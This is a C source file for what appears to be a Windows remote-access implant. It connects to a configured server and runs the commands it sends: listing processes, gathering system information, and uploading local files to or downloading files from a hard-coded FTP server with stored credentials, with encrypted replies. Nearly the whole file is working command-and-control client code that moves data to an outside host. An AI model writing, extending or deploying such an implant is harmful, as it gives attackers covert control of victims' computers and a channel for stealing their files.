#include <winsock2.h>
#include <windows.h>

#include "../utils/config.h"
#include "../utils/socket.h"
#include "../utils/userIO.h"
#include "../utils/command.h"
#include "../utils/encryption.h"
#include "../utils/logging.h"
#include "../utils/processes.h"
#include "../utils/information.h"
#include "../utils/ftp.h"

void downloadFile(char buffer[BUF_SIZE], char *URL);
void uploadFile(char buffer[BUF_SIZE], char *URL);

// General function type for handlers
typedef void (*commandFunction)(char buffer[BUF_SIZE], char *URL);

typedef struct
{
    char *commandName;
    commandFunction action;
} commandAction;

// Mapping of each command to its handler function
commandAction commandMapping[] = {
    {"PROCESSES", &getProcesses},
    {"INFORMATION", &getInformation},
    {"UPLOAD", &uploadFile},
    {"DOWNLOAD", &downloadFile},
};

int initializeClientSocket(SOCKET *clientSocket, const char *serverIp, int serverPort)
{
    struct sockaddr_in serverDetails;

    // Fill in server address information
    serverDetails.sin_family = AF_INET;
    serverDetails.sin_addr.s_addr = inet_addr(serverIp);
    serverDetails.sin_port = htons(serverPort);

    // Connect to server
    if (connect(*clientSocket, (struct sockaddr *)&serverDetails, sizeof(serverDetails)) < 0)
    {
        closesocket(*clientSocket);
        return 1;
    }
    return 0;
}

/**
 * Uploads a file from the system to a given URL
 * @param buffer Character array to store the success or error message.
 * @param URL The URL of the file to upload to.
 */
void uploadFile(char buffer[BUF_SIZE], char *URL)
{
    char filePath[BUF_SIZE];

    // Append the file name to the path of the local temporary directory.
    snprintf(filePath, BUF_SIZE, FTP_DWL_DIR, getBasename(URL));

    // Create a handle for the FTP server.
    HINTERNET ftpHandle = createFtpHandle(FTP_SERVER, FTP_USER, FTP_PASS);

    // Check if the handle creation was successful.
    if (!ftpHandle)
    {
        snprintf(buffer, BUF_SIZE, FTP_ERR_UPL, 2, URL);
        return;
    }
    else if (uploadFileFtp(&ftpHandle, URL, filePath) != 0)
    {
        snprintf(buffer, BUF_SIZE, FTP_ERR_UPL, 3, URL);
    }
    else
    {
        snprintf(buffer, BUF_SIZE, "[i] Successfully uploaded file into ftp://%s/%s\n", FTP_SERVER, filePath);
    }
}

/**
 * Downloads a file from a given URL and saves it to the local temporary directory.
 * @param buffer Character array to store the success or error message.
 * @param URL The URL of the file to download.
 */
void downloadFile(char buffer[BUF_SIZE], char *URL)
{
    // Create a character array to hold the path to the local temporary directory.
    char filePath[BUF_SIZE];

    // Append the file name to the path of the local temporary directory.
    snprintf(filePath, BUF_SIZE, getBasename(URL));

    // Create a handle for the FTP server.
    HINTERNET ftpHandle = createFtpHandle(FTP_SERVER, FTP_USER, FTP_PASS);

    // Check if the handle creation was successful.
    if (!ftpHandle)
    {
        snprintf(buffer, BUF_SIZE, FTP_ERR_DWL, 2, URL);
        return;
    }
    else if (downloadFileFtp(&ftpHandle, URL, filePath) != 0)
    {
        snprintf(buffer, BUF_SIZE, FTP_ERR_DWL, 3, URL);
    }
    else
    {
        snprintf(buffer, BUF_SIZE, "[i] Successfully downloaded file from ftp://%s/%s\n", FTP_SERVER, filePath);
    }
}

/**
 * Wrapper for socket::recv
 */
int fetchData(SOCKET *socket, char buffer[BUF_SIZE])
{
    return recv(*socket, buffer, BUF_SIZE, 0x0);
}

/**
 * Find the corresponding command handler for a given command and return the result of the handler
 *
 * @param commandName the string repr of the command
 * @param URL the URL required for special commands
 */
char *commandHandler(char *commandName, char *URL)
{
    static char buffer[BUF_SIZE];
    for (int i = 0; i < NUM_COMMANDS - 1; i++)
    {
        if (strcmp(commandName, (commandMapping + i)->commandName) == 0)
        {
            (commandMapping + i)->action(buffer, URL);
            return buffer;
        }
    }
    return NULL;
}

/**
 * Responsible for the two stage communication between client and server
 * Mostly a wrapper around socket::send
 */
int sendResponse(SOCKET *socket, COMMAND commandCode, char *buffer, int bufLen)
{
    char message[BUF_SIZE];
    snprintf(message, BUF_SIZE, PREAMBLE_FMT, commandCode, bufLen);
    if (send(*socket, message, BUF_SIZE, 0x0) == SOCKET_ERROR)
    {
        return SOCKET_ERROR;
    }
    return send(*socket, buffer, bufLen, 0x0);
}

/**
 * Handle server requests and error management
 *
 * @param socket server side socket
 */
void serverHandler(SOCKET socket)
{
    COMMAND command;
    char buffer[BUF_SIZE], URL[BUF_SIZE];
    int bytesReceived, expectedBuffer;

    // Main Loop
    while (TRUE)
    {
        bytesReceived = fetchData(&socket, buffer);
        if (bytesReceived == SOCKET_ERROR || !bytesReceived)
        {
            fprintf(stderr, "[%s][E] Could not fetch data", getCurrTime());
            break;
        }
        buffer[bytesReceived] = CF_NULL;
        // Parse the command
        parseCommand(buffer, &command, &expectedBuffer, NULL, FALSE);
        char *commandName = decodeCommand(command);

        // Check that it is a special command
        if (expectedBuffer > 0)
        {
            // Fetch additional data
            bytesReceived = fetchData(&socket, buffer);
            if (bytesReceived == SOCKET_ERROR || !bytesReceived)
            {
                fprintf(stderr, "[%s][E] Could not fetch data", getCurrTime());
                break;
            }
            buffer[bytesReceived] = CF_NULL;
            // Log request
            parseCommand(buffer, &command, &expectedBuffer, URL, TRUE);
            printf("[%s] Received %s\n", getCurrTime(), commandName);
            printf("[%s] URL:   [%s]\n", getCurrTime(), URL);
        }
        else
        {
            // Log request
            printf("[%s] Received %s\n", getCurrTime(), commandName);
            URL[0] = CF_NULL;
        }

        // Check for invalid or quit commands
        if (strcmp(commandName, QUIT) == 0)
        {
            break;
        }
        else if (strcmp(commandName, INVALID_COMMAND_TYPE) == 0)
        {
            break;
        }

        // Perform the requested operation
        char *result = commandHandler(commandName, URL);
        if (result == NULL)
        {
            fprintf(stderr, "[%s] Handle Error: %s\n", getCurrTime(), commandName);
            continue;
        }

        // Cleanup result
        strip(result);
        int bufLen = strlen(result);
        // Encrypt and send response
        encrypt(command, result, bufLen, bufLen + (bufLen & 1));
        if (sendResponse(&socket, command, result, bufLen) == SOCKET_ERROR)
        {
            fprintf(stderr, "[%s][E] Error sending response\n", getCurrTime());
        }
    }
    closesocket(socket);
    return;
}

int main(void)
{
    printf("[i] Initializing Client\n");
    char *serverIp = HOST;
    int serverPort = PORT;
    SOCKET clientSocket = createSocket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET)
    {
        exit(10);
    }

    // Accept and handle server connection
    if (initializeClientSocket(&clientSocket, serverIp, serverPort) != 0)
    {
        printf("[E] Could not connect to %s on port %i\n", serverIp, serverPort);
        printf("[i] Exiting...\n");
    }
    serverHandler(clientSocket);

    WSACleanup();
    return 0;
}
